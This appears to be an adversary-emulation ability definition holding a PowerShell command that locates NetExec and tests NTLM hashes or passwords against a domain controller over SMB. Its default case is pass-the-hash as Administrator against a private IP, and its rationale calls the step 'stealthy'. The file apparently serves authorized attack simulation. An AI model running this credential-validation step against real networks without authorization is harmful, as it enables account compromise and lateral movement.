ability.name: SMB Credential Validation via NetExec
ability.description: Executes one-packet credential validation against the target domain controller using nxc.exe.

stages.command_template: $d='C:\\Windows\\Temp\\bas'; if(!(Test-Path $d)){ni -ItemType Directory -Force $d|out-null}; $(try { $error.Clear(); Write-Output '[*] Running Credential Validation via NetExec...'; Write-Output '[*] Locating nxc.exe absolute path...'; $nxcPath = (Get-Command nxc.exe -ErrorAction SilentlyContinue).Path; if (!$nxcPath) { $nxcPath = (Get-ChildItem -Path C:\\ -Filter nxc.exe -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1).FullName }; if (!$nxcPath) { $nxcPath = (Get-ChildItem -Path . -Filter nxc.exe -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1).FullName }; if (!$nxcPath) { $nxcPath = 'nxc.exe' }; Write-Output ('[+] NetExec absolute path: ' + $nxcPath); if (Test-Path ($d + '\\l_pre_findings.json')) { $findings = Get-Content -Path ($d + '\\l_pre_findings.json') -Raw | ConvertFrom-Json; $target_ip = $findings.target_ip; $creds = $findings.credentials } else { $target_ip = '192.168.187.100'; $creds = @(@{ type = 'ntlm'; value = '31d6cfe0d16ae931b73c59d7e0c089c0'; user = 'Administrator' }) }; foreach ($cred in $creds) { $user = $cred.user; $val = $cred.value; if ($cred.type -eq 'ntlm') { Write-Output ('[*] Validating ' + $user + ' with hash ' + $val + ' against ' + $target_ip + '...'); & $nxcPath smb $target_ip -u $user -H $val | Tee-Object -FilePath ($d + '\\nxc_val_out.txt') } else { Write-Output ('[*] Validating ' + $user + ' with password against ' + $target_ip + '...'); & $nxcPath smb $target_ip -u $user -p $val | Tee-Object -FilePath ($d + '\\nxc_val_out.txt') } }; Write-Output '[+] Credential validation complete.' } catch { 'ERROR: ' + $_ }) | Tee-Object -FilePath ($d + '\\nxc_validation.txt')

rationale: Performs stealthy, non-disruptive validation of target credentials to satisfy the pre-execution constraints.
